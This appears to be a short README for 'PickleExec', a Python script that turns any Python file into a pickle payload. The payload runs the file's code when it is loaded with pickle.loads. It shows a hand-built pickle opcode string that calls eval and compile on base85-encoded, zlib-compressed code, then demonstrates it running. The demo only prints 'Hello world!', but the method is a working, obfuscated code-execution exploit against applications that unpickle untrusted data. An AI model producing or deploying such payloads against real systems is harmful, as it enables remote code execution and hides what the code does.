# PickleExec-python script for generating an exploit to run python code in pickle

## Usage:

Script to run in pickle:
```py
#HelloWorld.py
print('Hello world!')
```

Generate exploit:
```
Python script filename>HelloWorld.py
b'c__builtin__\neval\n(c__builtin__\ncompile\n(Vfrom base64 import b85decode;from zlib import decompress;exec(decompress(b85decode("c$_OJ%FHX#Q1?j9$;nqJ&o9bJQB>FD0svc+2Q&")).decode())\nV-\nVexec\ntRtR.'
```

Executing:
```py
Python 3.9.1 (default, Dec 13 2020, 11:55:53) 
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pickle import loads
>>> loads(b'c__builtin__\neval\n(c__builtin__\ncompile\n(Vfrom base64 import b85decode;from zlib import decompress;exec(decompress(b85decode("c$_OJ%FHX#Q1?j9$;nqJ&o9bJQB>FD0svc+2Q&")).decode())\nV-\nVexec\ntRtR.')
Hello world!
>>>
```